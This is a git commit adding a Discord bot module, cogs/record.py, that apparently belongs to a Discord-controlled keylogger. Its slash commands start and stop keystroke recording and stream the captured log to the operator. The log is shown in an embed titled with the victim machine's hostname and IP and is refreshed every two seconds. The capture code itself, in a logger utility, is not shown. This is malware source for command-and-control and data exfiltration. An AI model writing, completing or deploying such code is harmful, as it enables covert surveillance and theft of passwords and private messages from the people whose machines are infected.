c8e1e03292ec237a1acc318d6f3caf4ed847be2b
Hunney <robtdn06@gmail.com>
2025-07-31 13:23:12 +0800

    Commit 3

---
+++ cogs/record.py
@@ -0,0 +1,51 @@
+import discord
+from discord.ext import commands
+from discord import app_commands
+from utils import logger
+import asyncio
+
+class Record(commands.GroupCog):
+    group_name = "keystroke"
+    group_description = " commands"
+    dm_permission = True
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @app_commands.command(name="start", description="Start the recording")
+    async def start(self, interaction: discord.Interaction):
+        if not logger.get_keylog_state():
+            logger.set_keylog_state(True)
+            await interaction.response.send_message("Recording Started.", ephemeral=True)
+        else:
+            await interaction.response.send_message("Recording already running.", ephemeral=True)
+
+    @app_commands.command(name="stop", description="Stop the recording")
+    async def stop(self, interaction: discord.Interaction):
+        if logger.get_keylog_state():
+            logger.set_keylog_state(False)
+            await interaction.response.send_message("Recording stopped.", ephemeral=True)
+        else:
+            await interaction.response.send_message("Recording is not running.", ephemeral=True)
+
+    @app_commands.command(name="show", description="Show the records")
+    async def show(self, interaction: discord.Interaction):
+        embed = discord.Embed(
+            colour=discord.Colour.green(),
+            title=f"---- {logger.hostname} : {logger.ip} -----",
+            description=logger.get_log()
+        )
+
+        await interaction.response.send_message(embed=embed)
+        msg = await interaction.original_response()
+        while logger.get_keylog_state():
+            await asyncio.sleep(2)
+            new_embed = discord.Embed(
+                colour=discord.Colour.green(),
+                title=f"---- {logger.hostname} : {logger.ip} -----",
+                description=logger.get_log()
+            )
+            await msg.edit(embed=new_embed)
+
+async def setup(bot: commands.Bot):
+    await bot.add_cog(Record(bot))
